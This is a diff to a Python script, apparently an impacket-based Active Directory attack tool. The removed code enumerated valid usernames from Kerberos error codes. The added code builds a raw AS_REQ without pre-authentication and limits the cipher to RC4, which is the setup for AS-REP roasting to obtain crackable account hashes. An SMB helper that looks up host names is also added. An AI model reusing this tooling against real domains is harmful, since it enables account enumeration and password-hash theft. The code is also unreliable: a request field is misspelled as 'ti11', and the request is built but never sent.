@@ -1,14 +1,19 @@
-import logging
+import random
 import sys
-from binascii import unhexlify, hexlify
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from binascii import hexlify
+import datetime
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+
+from impacket import version
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
+from impacket.examples import logger
 from impacket.krb5 import constants
-from impacket.krb5.types import Principal
-from impacket.krb5.kerberosv5 import sendReceive, KerberosError, SessionError
-from pyasn1.codec.der import decoder
-from impacket.krb5.asn1 import TGS_REP, AS_REP
-import traceback
-import socket
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+from impacket.krb5.types import KerberosTime, Principal
+from impacket.ldap import ldap, ldapasn1
+from impacket.smbconnection import SMBConnection
 class TGT:
     def __init__(self, domain, username, dc, password='', preauth=False, nthash='', lmhash='', aeskey=''):
         self.username = username
@@ -24,44 +29,78 @@ class TGT:
 
 
 
-    def run(self) -> {'tgt':any, 'cipher':any, 'oldSessionKey':any, 'newSessonKey':any}:
+    def run(self, save=False) -> {'tgt':any, 'cipher':any, 'oldSessionKey':any, 'newSessonKey':any}:
         """setting save to True will save the tgt to the {username}.ccache"""
-        userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        try:
-            tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
-                                               domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
-                                               kdcHost=self.dc_ip, serverName=userclient)
-        
-            return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':oldSessionKey, 'newSessionKey':newSessionKey}
-        
-        except AttributeError:
-            sys.stdout.flush()
-            print("")
-            print(f"\n3 found user: {self.username} \n")
-            return None
-        except SessionError as e:
-            try:
-                code = e.getErrorCode()
-                if code != 6:
-                    sys.stdout.flush()
-                    print(f"\n 1found user: {self.username} {e} on code: {code}")
-            except:
-                sys.stdout.flush()
-                print(f"\n 2found user: {self.username}")
-        except Exception as e:
-            print(f"1 {traceback.format_exc()}")
-            print(f'trying with domain instead of user....')
-            serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
-            try:
-                tgt, cipher, old, new = getKerberosTGT(serverName, password=self.password, 
-                                               domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
-                                               kdcHost=self.dc_ip)
-                return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
-            except Exception as e:
-                None
 
-            return 1
 
+        clientName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        asReq = AS_REQ()
+        domain = self.domain.upper()
+        serverName = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
+        pacR = KERB_PA_PAC_REQUEST()
+        pacR['include-pac'] = True
+        encodePac = encoder.encode(pacR)
+        asReq['pvno'] = 5
+        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+        asReq['padata'] = noValue
+        asReq['padata'][0] = noValue
+        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+        asReq['padata'][0]['padata-value'] = encodePac
+        body = seq_set(asReq, 'req-body')
+        opt = []
+        opt.append(constants.KDCOptions.forwardable.value)
+        opt.append(constants.KDCOptions.renewable.value)
+        opt.append(constants.KDCOptions.proxiable.value)
+        body['kdc-options'] = constants.encodeFlags(opt)
+        seq_set(body, 'sname', serverName.components_to_asn1)
+        seq_set(body, 'cname', clientName.components_to_asn1)
+        body['realm'] = domain
+        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        body['ti11'] = KerberosTime.to_asn1(now)
+        body['rtime'] = KerberosTime.to_asn1(now)
+        body['nonce'] = random.getrandbits(31)
+        ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+        # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        # try:
+        #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
+        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
+        #                                        kdcHost=self.dc_ip)
+        
+        #     return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':oldSessionKey, 'newSessionKey':newSessionKey}
+        
+        # except AttributeError:
+        #     sys.stdout.flush()
+        #     print("")
+        #     print(f"\n3 found user: {self.username} \n")
+        #     return None
+        # except SessionError as e:
+        #     try:
+        #         code = e.getErrorCode()
+        #         if code != 6:
+        #             sys.stdout.flush()
+        #             print(f"\n 1found user: {self.username} {e} on code: {code}")
+        #     except:
+        #         sys.stdout.flush()
+        #         print(f"\n 2found user: {self.username}")
+        # except Exception as e:
+        #     print(f"1 {traceback.format_exc()}")
+        #     print(f'trying with domain instead of user....')
+        #     serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        #     try:
+        #         tgt, cipher, old, new = getKerberosTGT(serverName, password=self.password, 
+        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
+        #                                        kdcHost=self.dc_ip)
+        #         return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
+        #     except Exception as e:
+        #         None
+
+        #     return 1
+
+
+def getName(machine):
+    """ gets the machine name with the kdc host or domain """
+    s = SMBConnection(machine, machine)
+    return s.getServerName()
 
 
 class TGS:
